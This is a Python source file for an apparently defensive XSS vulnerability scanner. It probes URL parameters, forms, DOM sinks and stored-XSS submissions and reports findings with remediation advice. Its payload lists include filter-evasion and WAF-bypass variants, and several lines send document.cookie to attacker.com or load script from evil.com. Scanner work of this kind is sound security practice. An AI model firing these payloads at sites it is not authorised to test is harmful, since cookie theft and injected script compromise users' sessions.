import asyncio
import aiohttp
import random
import string
import uuid
import re
from typing import List, Dict, Any, Set, Optional
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from copy import deepcopy
import datetime

class EnhancedXSSScanner:
    """
    Enhanced scanner for detecting Cross-Site Scripting (XSS) vulnerabilities.
    """
    
    # XSS payloads to test
    xss_payloads = [
        # Basic alert payloads
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        
        # Event handlers
        "<iframe onload=alert('XSS')></iframe>",
        "<input autofocus onfocus=alert('XSS')>",
        "<select autofocus onfocus=alert('XSS')>",
        "<textarea autofocus onfocus=alert('XSS')>",
        "<keygen autofocus onfocus=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",
        "<audio><source onerror=alert('XSS')>",
        
        # JavaScript protocol
        "javascript:alert('XSS')",
        "<a href=\"javascript:alert('XSS')\">Click me</a>",
        "<a href=javascript:alert('XSS')>Click me</a>",
        
        # CSS-based XSS
        "<div style=\"background-image: url(javascript:alert('XSS'))\">",
        "<div style=width:expression(alert('XSS'))>",
        "<style>@import 'javascript:alert(\"XSS\")';</style>",
        
        # Object tag-based
        "<object data=\"javascript:alert('XSS')\"></object>",
        "<embed src=\"javascript:alert('XSS')\"></embed>",
        
        # Form-based
        "<form action=\"javascript:alert('XSS')\"><input type=submit>",
        "<isindex action=\"javascript:alert('XSS')\" type=submit value=click>",
        "<form><button formaction=javascript:alert('XSS')>click",
        
        # Other tag-based
        "<math><a xlink:href=\"javascript:alert('XSS')\">click",
        
        # Alternative JavaScript methods
        "<script>prompt('XSS')</script>",
        "<script>confirm('XSS')</script>",
        
        # Data URI
        "<script src=data:text/javascript,alert('XSS')></script>",
        "<script src=\"data:text/javascript,alert('XSS')\"></script>",
        
        # External script
        "<script src=//evil.com/xss.js></script>",
        
        # Encoded payloads
        "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",  # Base64: alert('XSS')
        
        # Filter evasion techniques
        "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--\n></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        
        # Exotic payloads
        "<script>new Image().src=\"http://attacker.com/?\"+document.cookie;</script>",
        "<script>fetch('http://attacker.com/?'+document.cookie);</script>",
        "<script>navigator.sendBeacon('http://attacker.com', document.cookie);</script>"
    ]
    
    # DOM-based XSS sinks to look for in JavaScript
    dom_xss_sinks = [
        "document.write(",
        "document.writeln(",
        "document.body.innerHTML",
        "document.documentElement.innerHTML",
        "document.innerHtml",
        "innerHTML",
        "outerHTML",
        "eval(",
        "setTimeout(",
        "setInterval(",
        "execScript(",
        "new Function(",
        "document.location",
        "location.href",
        "location.replace(",
        "location.assign(",
        "window.open(",
        "document.URL",
        "document.URLUnencoded",
        "document.referrer",
        "document.cookie",
        "document.domain",
        "element.src",
        "element.setAttribute(",
        "element.setAttribute('src',",
        "element.setAttribute('href',",
        "element.formAction",
        "jQuery.html(",
        "$(",
        "$.html(",
        "$()",
        "angular.element(",
        "angular.injector(",
        "angular.module(",
        "ng-bind-html",
        "ng-bind-template"
    ]
    
    # DOM-based XSS sources to look for in JavaScript
    dom_xss_sources = [
        "location",
        "location.href",
        "location.search",
        "location.hash",
        "location.pathname",
        "document.URL",
        "document.documentURI",
        "document.URLUnencoded",
        "document.baseURI",
        "document.referrer",
        "window.name",
        "history.pushState",
        "history.replaceState",
        "localStorage",
        "sessionStorage",
        "document.cookie",
        "document.querySelector",
        "document.getElementById",
        "document.getElementsByClassName",
        "document.getElementsByName",
        "document.getElementsByTagName",
        "document.forms",
        "postMessage",
        "addEventListener('message'",
        "XMLHttpRequest.responseText",
        "XMLHttpRequest.responseXML",
        "XMLHttpRequest.response",
        "jQuery.ajax",
        "$.ajax",
        "fetch("
    ]
    
    # WAF bypass payloads
    waf_bypass_payloads = [
        # Case variation
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<scRIPT>alert('XSS')</scRIPT>",
        
        # Tag breaking
        "<scr\nript>alert('XSS')</scr\nript>",
        "<scr\tipt>alert('XSS')</scr\tipt>",
        
        # Exotic whitespace
        "<script\x0D\x0A>alert('XSS')</script\x0D\x0A>",
        "<script\x09>alert('XSS')</script\x09>",
        
        # UTF-8 encoding
        "<script\u0020>alert('XSS')</script\u0020>",
        
        # Character escaping
        "<script>alert(/XSS/.source)</script>",
        
        # Alternative function calling
        "<script>window['alert']('XSS')</script>",
        "<script>this['ale'+'rt']('XSS')</script>",
        
        # Protocol bypass
        "j&#97;v&#97;script:alert('XSS')",
        "&#106;avascript:alert('XSS')",
        
        # HTML entities
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        
        # No quotes
        "<script>alert(String.fromCharCode(88,83,83))</script>"
    ]
    
    # Maximum number of concurrent requests
    max_concurrent_requests = 10
    
    async def scan_url(self, url: str) -> List[Dict[str, Any]]:
        """
        Scan a URL for XSS vulnerabilities.
        
        Args:
            url: The URL to scan
        
        Returns:
            A list of vulnerabilities found
        """
        all_vulnerabilities = []
        # Create a semaphore to limit concurrent requests
        semaphore = asyncio.Semaphore(5)
        
        # Create tasks for each type of check
        tasks = [
            self._check_url_parameters(url, semaphore),
            self._check_forms(url, semaphore),
            self._check_dom_xss(url, semaphore),
            self._check_stored_xss(url, semaphore),
            self._test_waf_bypass(url, semaphore)
        ]
        
        # Run all tasks concurrently
        results = await asyncio.gather(*tasks)
        
        # Combine all vulnerabilities found
        for result in results:
            all_vulnerabilities.extend(result)
        
        # Remove any duplicate vulnerabilities
        unique_vulns = []
        seen_ids = set()
        
        for vuln in all_vulnerabilities:
            if vuln['id'] not in seen_ids:
                seen_ids.add(vuln['id'])
                unique_vulns.append(vuln)
        
        # Add more context and metadata
        for vuln in unique_vulns:
            vuln['scanner'] = 'EnhancedXSSScanner'
            vuln['timestamp'] = datetime.datetime.now().isoformat()
            
            # Add OWASP reference
            vuln['references'] = [
                "https://owasp.org/www-community/attacks/xss/",
                "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
            ]
        
        return unique_vulns

    async def _check_url_parameters(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check URL parameters for reflected XSS vulnerabilities.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # Parse the URL
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            # If there are no parameters, check the URL path for parameters
            if not query_params:
                path_parts = parsed_url.path.split('/')
                for i, part in enumerate(path_parts):
                    if '=' in part:  # This might be a parameter
                        key, value = part.split('=', 1)
                        query_params[key] = [value]
                    elif i > 0 and path_parts[i-1].lower() in ['id', 'user', 'page', 'article', 'post', 'item']:
                        # This might be a value for a parameter in RESTful API style
                        key = path_parts[i-1].lower()
                        query_params[key] = [part]
            
            # If still no parameters, try to find forms and links
            if not query_params:
                # Fetch the page content
                async with semaphore:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                            if response.status != 200:
                                return []
                            html_content = await response.text()
                            
                            # Parse the HTML
                            soup = BeautifulSoup(html_content, 'html.parser')
                            
                            # Find forms
                            forms = soup.find_all('form')
                            for form in forms:
                                form_action = form.get('action', '')
                                form_method = form.get('method', 'get').lower()
                                
                                if form_method == 'get':
                                    form_url = urljoin(url, form_action)
                                    parsed_form_url = urlparse(form_url)
                                    
                                    # Extract input fields
                                    for input_field in form.find_all(['input', 'textarea']):
                                        input_name = input_field.get('name', '')
                                        if input_name:
                                            query_params[input_name] = ['test']
                            
                            # Find links with parameters
                            for a_tag in soup.find_all('a', href=True):
                                href = a_tag['href']
                                if '?' in href:
                                    link_url = urljoin(url, href)
                                    parsed_link = urlparse(link_url)
                                    link_params = parse_qs(parsed_link.query)
                                    
                                    for key, values in link_params.items():
                                        if key not in query_params:
                                            query_params[key] = values
            
            # Create tasks for each parameter
            tasks = []
            for param_name, param_values in query_params.items():
                if param_values and param_values[0]:
                    # Test each payload for this parameter
                    for payload in self.xss_payloads:
                        # Use a unique identifier for this test
                        test_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                        customized_payload = payload.replace("XSS", test_id).replace("'XSS'", f"'{test_id}'")
                        
                        tasks.append(self._test_reflected_xss(url, param_name, param_values[0], 
                                                            customized_payload, test_id, "url", semaphore))
            
            # Run all tasks concurrently
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Filter out exceptions and None results
            for result in results:
                if isinstance(result, dict) and result:
                    vulnerabilities.append(result)
        
        except Exception as e:
            print(f"Error checking URL parameters for XSS: {str(e)}")
        
        return vulnerabilities
    
    async def _test_reflected_xss(self, url: str, param_name: str, param_value: str, 
                                payload: str, test_id: str, location_type: str, 
                                semaphore: asyncio.Semaphore, method: str = "get") -> Dict[str, Any]:
        """
        Test a parameter for reflected XSS.
        
        Args:
            url: The URL to test
            param_name: The parameter name
            param_value: The parameter value
            payload: The XSS payload to test
            test_id: A unique identifier for this test
            location_type: Type of location (url or form)
            semaphore: Semaphore to limit concurrent requests
            method: HTTP method (get or post)
            
        Returns:
            A vulnerability dict if found, None otherwise
        """
        try:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            new_params = {k: v[:] if isinstance(v, list) else [v] for k, v in query_params.items()}
            
            # Modify the target parameter
            new_params[param_name] = [payload]
            
            # Reconstruct the URL
            new_query = urlencode(new_params, doseq=True)
            new_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, 
                                parsed_url.params, new_query, parsed_url.fragment))
            
            # Send the request
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    if method.lower() == "post":
                        form_data = {k: v[0] for k, v in new_params.items()}
                        async with session.post(url, data=form_data, 
                                             timeout=aiohttp.ClientTimeout(total=10)) as response:
                            
                            # Check for XSS protection headers
                            has_protection = any(h.lower() in ['x-xss-protection', 'content-security-policy'] 
                                                for h in response.headers)
                            
                            response_text = await response.text()
                    else:
                        async with session.get(new_url, 
                                            timeout=aiohttp.ClientTimeout(total=10)) as response:
                            
                            # Check for XSS protection headers
                            has_protection = any(h.lower() in ['x-xss-protection', 'content-security-policy'] 
                                                for h in response.headers)
                            
                            response_text = await response.text()
            
            # Check if the payload is reflected unchanged
            if payload in response_text:
                # Further checks to avoid false positives
                if self._validate_xss_reflection(response_text, payload, test_id):
                    return {
                        "id": str(uuid.uuid4()),
                        "name": "Reflected Cross-Site Scripting (XSS)",
                        "description": f"Reflected XSS vulnerability detected in {location_type} parameter: {param_name}",
                        "severity": "high",
                        "location": url,
                        "evidence": f"Parameter '{param_name}' with payload '{payload}' was reflected in the response",
                        "protection": "No XSS protection headers detected" if not has_protection else "XSS protection headers present but bypassed",
                        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP)."
                    }
            
            # Check for potential DOM-based XSS (if the payload is not directly reflected)
            if test_id in response_text or any(sink in response_text for sink in self.dom_xss_sinks):
                # Analyze JavaScript content for possible DOM XSS
                if self._check_javascript_for_xss(response_text, param_name):
                    return {
                        "id": str(uuid.uuid4()),
                        "name": "Potential DOM-Based Cross-Site Scripting (XSS)",
                        "description": f"Potential DOM-based XSS vulnerability detected with {location_type} parameter: {param_name}",
                        "severity": "medium",
                        "location": url,
                        "evidence": f"Parameter '{param_name}' might be used in a DOM XSS sink",
                        "remediation": "Use safe DOM APIs like textContent instead of innerHTML. Implement a Content Security Policy and sanitize user inputs."
                    }
            
            return None
        
        except Exception as e:
            print(f"Error testing reflected XSS for parameter {param_name}: {str(e)}")
            return None
    
    def _validate_xss_reflection(self, response_text: str, payload: str, test_id: str) -> bool:
        """
        Validate that the XSS reflection is likely to be exploitable.
        
        Args:
            response_text: The HTTP response text
            payload: The XSS payload that was used
            test_id: The unique identifier for this test
            
        Returns:
            True if the reflection appears to be exploitable, False otherwise
        """
        # Check if the payload appears in JavaScript context
        javascript_contexts = re.findall(r'<script[^>]*>(.*?)</script>', response_text, re.DOTALL | re.IGNORECASE)
        for context in javascript_contexts:
            if payload in context or test_id in context:
                return True
        
        # Check if the payload appears in an attribute value
        attribute_pattern = r'<[^>]+?(' + re.escape(payload) + '|' + re.escape(test_id) + ')[^>]*?>'
        if re.search(attribute_pattern, response_text):
            return True
        
        # Check if the payload appears as HTML content
        html_content_pattern = r'>([^<]*?(' + re.escape(payload) + '|' + re.escape(test_id) + ')[^<]*?)<'
        if re.search(html_content_pattern, response_text):
            return True
        
        # Check if the payload appears in a data or src attribute
        data_src_pattern = r'(data|src)=([\'"]?)[^\'"]*(' + re.escape(payload) + '|' + re.escape(test_id) + ')'
        if re.search(data_src_pattern, response_text, re.IGNORECASE):
            return True
        
        # If the entire payload is reflected verbatim, it's likely exploitable
        if payload in response_text:
            # But check it's not in a comment or CDATA section
            comment_pattern = r'<!--.*?(' + re.escape(payload) + '|' + re.escape(test_id) + ').*?-->'
            cdata_pattern = r'<!\[CDATA\[.*?(' + re.escape(payload) + '|' + re.escape(test_id) + ').*?]]>'
            
            if not (re.search(comment_pattern, response_text, re.DOTALL) or 
                   re.search(cdata_pattern, response_text, re.DOTALL)):
                return True
        
        return False
    
    def _check_javascript_for_xss(self, response_text: str, param_name: str) -> bool:
        """
        Check JavaScript content for potential DOM XSS vulnerabilities.
        
        Args:
            response_text: The HTTP response text
            param_name: The name of the parameter being tested
            
        Returns:
            True if potential DOM XSS is found, False otherwise
        """
        # Extract all JavaScript
        javascript_contexts = re.findall(r'<script[^>]*>(.*?)</script>', response_text, re.DOTALL | re.IGNORECASE)
        javascript = ' '.join(javascript_contexts)
        
        # Look for the parameter name in JavaScript
        param_pattern = r'(location\.search|location\.hash|document\.URL|' + re.escape(param_name) + r')'
        if not re.search(param_pattern, javascript):
            return False
        
        # Check if any sinks are present and potentially connected to the parameter
        for sink in self.dom_xss_sinks:
            sink_pattern = re.escape(sink) + r'.*?(' + param_pattern + r'|.*?' + param_pattern + r')'
            if re.search(sink_pattern, javascript, re.DOTALL):
                return True
        
        return False
    
    async def _check_forms(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check forms for reflected XSS vulnerabilities.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # Fetch the page content
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        if response.status != 200:
                            return []
                        html_content = await response.text()
            
            # Parse the HTML
            soup = BeautifulSoup(html_content, 'html.parser')
            forms = soup.find_all('form')
            
            # Process each form
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                
                # Resolve the form action URL
                if form_action.startswith('http'):
                    form_url = form_action
                elif form_action.startswith('/'):
                    parsed_url = urlparse(url)
                    form_url = f"{parsed_url.scheme}://{parsed_url.netloc}{form_action}"
                else:
                    # Relative URL
                    base_url = url.rsplit('/', 1)[0] if '/' in url.split('://', 1)[1] else url
                    form_url = f"{base_url}/{form_action}"
                
                # Process each input field in the form
                input_fields = form.find_all(['input', 'textarea', 'select'])
                
                # Detect if this is a login/authentication form
                is_auth_form = any(input_field.get('type', '').lower() == 'password' for input_field in input_fields)
                is_auth_form = is_auth_form or any(keyword in str(form).lower() for keyword in ['login', 'auth', 'sign in', 'signin'])
                
                # Get CSRF tokens if present
                csrf_tokens = {}
                for input_field in input_fields:
                    field_name = input_field.get('name', '').lower()
                    if any(token_name in field_name for token_name in ['csrf', 'token', 'xsrf', 'nonce']):
                        csrf_tokens[input_field.get('name')] = input_field.get('value', '')
                
                for input_field in input_fields:
                    input_type = input_field.get('type', '').lower()
                    input_name = input_field.get('name', '')
                    
                    # Skip submit, button, file inputs, etc.
                    if not input_name or input_type in ['submit', 'button', 'file', 'image', 'reset', 'checkbox', 'radio', 'password']:
                        continue
                    
                    # For authentication forms, be more careful with testing
                    if is_auth_form:
                        # Only test a subset of less intrusive payloads
                        safe_payloads = [p for p in self.xss_payloads[:5] if 'alert' in p]
                    else:
                        # Use all payloads for regular forms
                        safe_payloads = self.xss_payloads
                    
                    # Test each payload
                    for payload in safe_payloads:
                        # Use a unique identifier for this test
                        test_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                        customized_payload = payload.replace("XSS", test_id).replace("'XSS'", f"'{test_id}'")
                        
                        # Get other form field values to submit together
                        form_data = {}
                        for field in input_fields:
                            field_name = field.get('name', '')
                            if field_name and field_name != input_name:
                                # Use default values for other fields
                                field_type = field.get('type', '').lower()
                                
                                if field_type == 'checkbox':
                                    form_data[field_name] = 'on' if field.get('checked') else ''
                                elif field_type == 'radio':
                                    if field.get('checked'):
                                        form_data[field_name] = field.get('value', '')
                                elif field_name in csrf_tokens:
                                    form_data[field_name] = csrf_tokens[field_name]
                                else:
                                    form_data[field_name] = field.get('value', '')
                        
                        # Add our payload
                        form_data[input_name] = customized_payload
                        
                        # Test for reflected XSS
                        result = await self._test_reflected_xss_in_form(form_url, input_name, customized_payload, 
                                                                    test_id, form_data, form_method, semaphore)
                        if result:
                            vulnerabilities.append(result)
        
        except Exception as e:
            print(f"Error checking forms for XSS: {str(e)}")
        
        return vulnerabilities
    
    async def _test_reflected_xss_in_form(self, form_url: str, input_name: str, payload: str, 
                                         test_id: str, form_data: Dict[str, str], 
                                         method: str, semaphore: asyncio.Semaphore) -> Optional[Dict[str, Any]]:
        """
        Test a form input for reflected XSS.
        
        Args:
            form_url: The form action URL
            input_name: The name of the input field
            payload: The XSS payload
            test_id: Unique identifier for this test
            form_data: All form field data
            method: HTTP method (get or post)
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A vulnerability dict if found, None otherwise
        """
        try:
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    if method.lower() == 'post':
                        async with session.post(form_url, data=form_data, 
                                             timeout=aiohttp.ClientTimeout(total=10),
                                             allow_redirects=True) as response:
                            
                            # Check for XSS protection headers
                            has_protection = any(h.lower() in ['x-xss-protection', 'content-security-policy'] 
                                                for h in response.headers)
                            
                            response_text = await response.text()
                    else:  # GET
                        # Convert form data to query parameters
                        parsed_url = urlparse(form_url)
                        query_params = parse_qs(parsed_url.query)
                        
                        # Add form data to query parameters
                        for field_name, field_value in form_data.items():
                            query_params[field_name] = [field_value]
                        
                        # Reconstruct the URL
                        new_query = urlencode(query_params, doseq=True)
                        new_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, 
                                            parsed_url.params, new_query, parsed_url.fragment))
                        
                        async with session.get(new_url, 
                                            timeout=aiohttp.ClientTimeout(total=10),
                                            allow_redirects=True) as response:
                            
                            # Check for XSS protection headers
                            has_protection = any(h.lower() in ['x-xss-protection', 'content-security-policy'] 
                                                for h in response.headers)
                            
                            response_text = await response.text()
            
            # Check if the payload is reflected unchanged
            if payload in response_text:
                # Further checks to avoid false positives
                if self._validate_xss_reflection(response_text, payload, test_id):
                    return {
                        "id": str(uuid.uuid4()),
                        "name": "Reflected Cross-Site Scripting (XSS)",
                        "description": f"Reflected XSS vulnerability detected in form parameter: {input_name}",
                        "severity": "high",
                        "location": form_url,
                        "evidence": f"Parameter '{input_name}' with payload '{payload}' was reflected in the response",
                        "protection": "No XSS protection headers detected" if not has_protection else "XSS protection headers present but bypassed",
                        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP)."
                    }
            
            # Check for potential DOM-based XSS
            if test_id in response_text:
                # Analyze JavaScript content for possible DOM XSS
                if self._check_javascript_for_xss(response_text, input_name):
                    return {
                        "id": str(uuid.uuid4()),
                        "name": "Potential DOM-Based Cross-Site Scripting (XSS)",
                        "description": f"Potential DOM-based XSS vulnerability detected with form parameter: {input_name}",
                        "severity": "medium",
                        "location": form_url,
                        "evidence": f"Parameter '{input_name}' might be used in a DOM XSS sink",
                        "remediation": "Use safe DOM APIs like textContent instead of innerHTML. Implement a Content Security Policy and sanitize user inputs."
                    }
            
            return None
        
        except Exception as e:
            print(f"Error testing form XSS for input {input_name}: {str(e)}")
            return None
    
    async def _check_dom_xss(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check for DOM-based XSS vulnerabilities.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # Fetch the page content
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        if response.status != 200:
                            return []
                        html_content = await response.text()
            
            # Parse the HTML
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Extract all JavaScript code
            scripts = soup.find_all('script')
            all_js_code = ""
            for script in scripts:
                if script.string:
                    all_js_code += script.string + "\n"
                elif script.get('src'):
                    # Try to fetch external scripts
                    script_url = urljoin(url, script['src'])
                    try:
                        async with semaphore:
                            async with aiohttp.ClientSession() as session:
                                async with session.get(script_url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                                    if response.status == 200:
                                        all_js_code += await response.text() + "\n"
                    except Exception:
                        pass  # Skip if we can't fetch external script
            
            # Check inline event handlers
            inline_js = ""
            for tag in soup.find_all(True):
                for attr in tag.attrs:
                    if attr.lower().startswith('on'):
                        inline_js += f"// {tag.name} {attr}={tag[attr]}\n"
            
            all_js_code += inline_js
            
            # Check for DOM XSS sinks and sources
            sink_source_map = {}
            
            for sink in self.dom_xss_sinks:
                if sink in all_js_code:
                    sink_pattern = re.escape(sink) + r'[^;{]*?([^;]*?)'
                    sink_matches = re.findall(sink_pattern, all_js_code)
                    
                    for match in sink_matches:
                        sink_context = match
                        possible_sources = []
                        
                        for source in self.dom_xss_sources:
                            if source in sink_context:
                                possible_sources.append(source)
                        
                        if possible_sources:
                            sink_source_map[sink] = possible_sources
            
            # Create a vulnerability for each sink with a source
            for sink, sources in sink_source_map.items():
                source_str = ", ".join(sources)
                
                vulnerabilities.append({
                    "id": str(uuid.uuid4()),
                    "name": "DOM-based Cross-Site Scripting (XSS)",
                    "description": f"DOM-based XSS vulnerability detected with sink: {sink} and source(s): {source_str}",
                    "severity": "high",
                    "location": url,
                    "evidence": f"Sink: {sink}, Source(s): {source_str} found in JavaScript code",
                    "remediation": "Sanitize and validate all user inputs before using them in JavaScript. Use safe DOM APIs like textContent instead of innerHTML. Consider using a Content Security Policy (CSP)."
                })
            
            # Look for dynamic DOM manipulation that doesn't sanitize inputs
            if any(vuln_pattern in all_js_code for vuln_pattern in [
                "element.innerHTML", 
                "document.write(",
                "eval(",
                "$(",
                "$()",
                "document.createElement"
            ]):
                input_sources = any(
                    source_pattern in all_js_code for source_pattern in [
                        "location.hash",
                        "location.search",
                        "document.referrer",
                        "document.URL",
                        "window.name"
                    ]
                )
                
                if input_sources and not any(
                    sanitize_pattern in all_js_code for sanitize_pattern in [
                        "DOMPurify", 
                        "sanitize", 
                        "escape", 
                        "encodeURI",
                        "textContent"
                    ]
                ):
                    vulnerabilities.append({
                        "id": str(uuid.uuid4()),
                        "name": "Potential DOM-based Cross-Site Scripting (XSS)",
                        "description": "JavaScript code dynamically manipulates the DOM using user-controlled input without proper sanitization",
                        "severity": "medium",
                        "location": url,
                        "evidence": "DOM manipulation with user input without sanitization",
                        "remediation": "Use a DOM purification library like DOMPurify. Use safe DOM APIs like textContent instead of innerHTML. Implement proper input sanitization."
                    })
        
        except Exception as e:
            print(f"Error checking for DOM-based XSS: {str(e)}")
        
        return vulnerabilities 

    async def _check_stored_xss(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Attempt to detect stored XSS by submitting payloads and then checking if they appear on subsequent pages.
        
        Args:
            url: The target URL
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # Get a list of all submittable forms
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        if response.status != 200:
                            return []
                        html_content = await response.text()
            
            # Parse the HTML
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Find all forms that might allow input submission
            forms = soup.find_all('form')
            
            # Identify likely submission forms (e.g., comment forms, message forms, etc.)
            submission_forms = []
            for form in forms:
                # Identify forms with post methods that might be used for content submission
                if (form.get('method', '').lower() == 'post' and
                        any(area in str(form).lower() for area in 
                           ['comment', 'post', 'message', 'review', 'feedback', 'text', 'content'])):
                    
                    # Check if the form has text input or textarea
                    inputs = form.find_all(['input', 'textarea'])
                    has_text_input = any(
                        inp.get('type', '') == 'text' or inp.name == 'textarea' 
                        for inp in inputs
                    )
                    
                    if has_text_input:
                        submission_forms.append(form)
            
            # For each submission form, try storing potential XSS payload
            for form in submission_forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'post').lower()
                
                # Resolve the form action URL
                if form_action.startswith('http'):
                    form_url = form_action
                elif form_action.startswith('/'):
                    parsed_url = urlparse(url)
                    form_url = f"{parsed_url.scheme}://{parsed_url.netloc}{form_action}"
                else:
                    # Relative URL
                    base_url = url.rsplit('/', 1)[0] if '/' in url.split('://', 1)[1] else url
                    form_url = f"{base_url}/{form_action}"
                
                # Get all form inputs
                input_fields = form.find_all(['input', 'textarea'])
                
                # Find the most likely field for content submission
                content_field = None
                for field in input_fields:
                    # Check if this is a content field by name or type
                    if field.name == 'textarea' or (
                        field.name == 'input' and 
                        field.get('type', '') in ['text', ''] and
                        any(content_term in (field.get('name', '') + field.get('id', '')).lower() 
                            for content_term in ['content', 'comment', 'message', 'body', 'text', 'post'])
                    ):
                        content_field = field
                        break
                
                if not content_field:
                    # If no obvious content field, use the first textarea or text input
                    for field in input_fields:
                        if field.name == 'textarea' or (
                            field.name == 'input' and field.get('type', '') in ['text', '']
                        ):
                            content_field = field
                            break
                
                if not content_field:
                    continue  # No suitable field found
                
                # Get the name of the content field
                content_field_name = content_field.get('name', '')
                if not content_field_name:
                    continue
                
                # Create a payload with a unique identifier for tracking
                xss_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                # Use a less aggressive payload to avoid being blocked
                stored_xss_payload = f'Test<img src=x onerror="console.log(\'{xss_id}\')">'
                
                # Prepare form data for submission
                form_data = {}
                
                # Get CSRF tokens if present
                for input_field in input_fields:
                    field_name = input_field.get('name', '').lower()
                    if any(token_name in field_name for token_name in ['csrf', 'token', 'xsrf', 'nonce']):
                        form_data[input_field.get('name')] = input_field.get('value', '')
                
                # Fill required fields with dummy data
                for field in input_fields:
                    field_name = field.get('name', '')
                    if not field_name or field_name == content_field_name:
                        continue
                    
                    if field.get('required') or 'required' in str(field).lower():
                        field_type = field.get('type', '').lower()
                        
                        if field_type == 'email':
                            form_data[field_name] = 'test@example.com'
                        elif field_type == 'number':
                            form_data[field_name] = '123'
                        elif field_type == 'checkbox':
                            form_data[field_name] = 'on'
                        elif field_type == 'radio':
                            form_data[field_name] = field.get('value', 'on')
                        elif field_type == 'tel':
                            form_data[field_name] = '1234567890'
                        elif field_type == 'url':
                            form_data[field_name] = 'https://example.com'
                        elif field_type == 'password':
                            form_data[field_name] = 'Password123!'
                        else:
                            form_data[field_name] = 'Test input'
                
                # Add our XSS payload to the content field
                form_data[content_field_name] = stored_xss_payload
                
                # Submit the form
                try:
                    async with semaphore:
                        async with aiohttp.ClientSession() as session:
                            if form_method == 'post':
                                async with session.post(
                                    form_url, 
                                    data=form_data,
                                    timeout=aiohttp.ClientTimeout(total=10),
                                    allow_redirects=True
                                ) as response:
                                    # Get the response URL after potential redirects
                                    response_url = str(response.url)
                                    response_text = await response.text()
                            else:
                                # Convert form data to query parameters for GET requests
                                params = {k: v for k, v in form_data.items()}
                                async with session.get(
                                    form_url, 
                                    params=params,
                                    timeout=aiohttp.ClientTimeout(total=10),
                                    allow_redirects=True
                                ) as response:
                                    response_url = str(response.url)
                                    response_text = await response.text()
                    
                    # Check if the payload is immediately stored and reflected
                    if stored_xss_payload in response_text:
                        vulnerabilities.append({
                            "id": str(uuid.uuid4()),
                            "name": "Stored Cross-Site Scripting (XSS)",
                            "description": "Stored XSS vulnerability detected where user input is stored and displayed without proper sanitization",
                            "severity": "critical",
                            "location": f"{form_url} -> {response_url}",
                            "evidence": f"Payload '{stored_xss_payload}' was stored and reflected in the response",
                            "remediation": "Implement proper input sanitization and output encoding. Use a Content Security Policy (CSP) and consider using a library like DOMPurify for sanitization."
                        })
                    
                    # If we have a redirect, check the page where the content might be displayed
                    # This is often the case with comment systems that redirect to the page with comments
                    if response_url != form_url and response_url != url:
                        # Check the redirected page for our payload
                        async with semaphore:
                            async with aiohttp.ClientSession() as session:
                                async with session.get(
                                    response_url,
                                    timeout=aiohttp.ClientTimeout(total=10)
                                ) as redirect_response:
                                    redirect_text = await redirect_response.text()
                        
                        if stored_xss_payload in redirect_text:
                            vulnerabilities.append({
                                "id": str(uuid.uuid4()),
                                "name": "Stored Cross-Site Scripting (XSS)",
                                "description": "Stored XSS vulnerability detected where user input is stored and displayed without proper sanitization",
                                "severity": "critical",
                                "location": f"{form_url} -> {response_url}",
                                "evidence": f"Payload '{stored_xss_payload}' was stored and reflected in the redirected page",
